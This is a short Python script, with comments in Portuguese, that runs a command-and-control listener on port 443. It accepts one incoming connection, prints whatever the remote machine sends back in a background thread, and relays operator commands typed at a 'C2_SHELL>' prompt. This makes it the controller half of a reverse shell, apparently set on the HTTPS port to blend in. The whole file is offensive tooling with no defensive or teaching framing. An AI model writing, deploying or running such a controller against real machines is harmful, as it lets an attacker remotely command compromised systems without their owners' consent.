import socket
import sys
import threading

LISTEN_IP = "0.0.0.0"
PORT = 443

def receive_handler(client_socket):
    """Thread dedicada a escutar o cliente continuamente."""
    while True:
        try:
            data = client_socket.recv(4096).decode(errors="ignore")
            if not data:
                print("\n[-] Client disconnected.")
                break
            print(data, end="", flush=True)
        except socket.timeout:
            continue
        except Exception:
            break
    print("\n[*] Receiver thread stopped.")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {LISTEN_IP}:{PORT}...")
    except Exception as e:
        print(f"[!] Error binding to {LISTEN_IP}:{PORT}: {e}")
        sys.exit(1)
        
    try:
        client_socket, client_address = server.accept()
        print(f"[+] Connection established from {client_address[0]}:{client_address[1]}")
        
        # Timeout curto evita travamento eterno caso o socket falhe
        client_socket.settimeout(2.0)
        
        # Inicia a thread de recebimento contínuo
        recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
        recv_thread.start()
        
        while True:
            try:
                # O input agora fica livre para digitação a qualquer momento
                command = input("C2_SHELL> ").strip()
                if not command:
                    continue
                    
                client_socket.send(command.encode())
                
                if command == "/exit":
                    print("[*] Closing connection.")
                    break
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Error sending command: {e}")
                break
                    
    except KeyboardInterrupt:
        print("\n[*] Server stopping...")
    except Exception as e:
        print(f"\n[!] Server error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()
